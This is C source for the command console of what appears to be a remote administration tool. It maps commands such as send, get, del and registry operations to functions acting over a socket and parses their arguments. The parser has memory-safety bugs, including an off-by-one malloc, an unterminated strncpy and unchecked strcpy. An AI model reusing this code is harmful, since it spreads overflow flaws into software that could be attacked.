#include "user_in.h"

int usr_run = 0;

void init_cmds() //COMMANDS -> 10
{
    strcpy(cmd_funcs[0].cmd_name, "ls");
    cmd_funcs[0].cmd_func = cmd_ls;

    strcpy(cmd_funcs[1].cmd_name, "exit");
    cmd_funcs[1].cmd_func = cmd_exit;

    strcpy(cmd_funcs[2].cmd_name, "stop");
    cmd_funcs[2].cmd_func = cmd_stop;

    strcpy(cmd_funcs[3].cmd_name, "cd");
    cmd_funcs[3].cmd_func = cmd_cd;

    strcpy(cmd_funcs[4].cmd_name, "ping");
    cmd_funcs[4].cmd_func = cmd_ping;

    strcpy(cmd_funcs[5].cmd_name, "send");
    cmd_funcs[5].cmd_func = cmd_send;

    strcpy(cmd_funcs[6].cmd_name, "get");
    cmd_funcs[6].cmd_func = cmd_get;

    strcpy(cmd_funcs[7].cmd_name, "del");
    cmd_funcs[7].cmd_func = cmd_del;

    strcpy(cmd_funcs[8].cmd_name, "rege");
    cmd_funcs[8].cmd_func = cmd_rege;

    strcpy(cmd_funcs[9].cmd_name, "regs");
    cmd_funcs[9].cmd_func = cmd_regs;
}

void wait_input(SOCKET *s)
{
    char buffer[512];
    char input[512];
    char cmd_name[10];
    char *token;
    int arg_count;
    char *args[32];

    strcpy(curr_path, "");
    strcpy(last_path, "");

    usr_run = 1;
    while(usr_run)
    {
        printf("%s> ", curr_path);

        fgets(input, 512, stdin);
        if(strlen(input)>0 && input[strlen(input)-1] == '\n')
            input[strlen(input)-1] = '\0';

        strcpy(buffer, input);
        token = strtok(buffer, " ");
        strncpy(cmd_name, token, 10);

        analyse_input(input, strlen(cmd_name), args, &arg_count, 32);
//      printf("Arg count : %d\n", arg_count);
//      int j;
//      for(j = 0; j<arg_count; j++)
//      {
//          printf("Arg %d : %s\n", j, args[j]);
//      }

        int r = -1;
        int i = 0;
        for(i = 0; i<COMMANDS; i++)
        {
            if(strcmp(cmd_funcs[i].cmd_name, cmd_name) == 0)
            {
                r = cmd_funcs[i].cmd_func(s, arg_count, args);
            }
        }

        if(r == -1)
        {
            printf("No command found for \"%s\".\n", cmd_name);
        }

        for(i = 0; i<arg_count; i++)
        {
            free((void *) args[i]);
        }

        if(get_wait_res() == -1)
        {
            usr_run = 0;
            break;
        }
    }
}

void analyse_input(char *input, int cmd_name_len, char **args, int *out_arg_count, int max_args)
{
    int arg_count = 0;
    char *str_ptr;
    char buffer2[512];
    int input_sz = strlen(input);

    str_ptr = input + cmd_name_len+1;
    while(str_ptr < input+input_sz)
    {
        if(arg_count >= max_args)
        {
            printf("%d arguments max.\n", max_args);
            break;
        }
        if(*str_ptr == ' ')
        {
            str_ptr++;
            continue;
        }
        if(*str_ptr == '\"')
        {
            buffer2[0] = *str_ptr;
            int i = 0;
            while(1)
            {
                str_ptr++;
                if(i >= 512)
                {
                    printf("Error : argument %d too long (512 characters max.).\n", arg_count);
                    return;
                }
                buffer2[i] = *str_ptr;
                if(*str_ptr == '\"' || str_ptr > input+input_sz)
                {
                    str_ptr++;
                    break;
                }
                i++;
            }
            buffer2[i] = '\0';

            char *arg = (char *) malloc(strlen(buffer2));
            if(arg == NULL)
            {
                printf("[!!] Fatal Error : failed to allocate memory.\n");
                return;
            }
            strcpy(arg, buffer2);
            args[arg_count] = arg;
            arg_count++;
        } else
        {
            buffer2[0] = *str_ptr;
            int i = 0;
            while(1)
            {
                if(i >= 512)
                {
                    printf("Error : argument %d too long (512 characters max.).\n", arg_count);
                    return;
                }
                if(*str_ptr == ' ' || str_ptr > input+input_sz)
                {
                    str_ptr++;
                    break;
                }
                buffer2[i] = *str_ptr;
                str_ptr++;
                i++;
            }
            buffer2[i] = '\0';

            char *arg = (char *) malloc(strlen(buffer2) + 1);
            if(arg == NULL)
            {
                printf("[!!] Fatal Error : failed to allocate memory.\n");
                return;
            }
            strcpy(arg, buffer2);
            args[arg_count] = arg;
            arg_count++;
        }
    }

    *out_arg_count = arg_count;
}

void get_path(const char *input, char *path)
{
    if(strchr(input, ':') == 0)
    {
        strcpy(path, curr_path);
        strcat(path, input);
    } else
    {
        strcpy(path, input);
    }

    if(strchr(path, '/') != NULL)
    {
        int i;
        for(i = 0; i<strlen(path); i++)
        {
            if(path[i] == '/')
                path[i] = '\\';
        }
    }
}
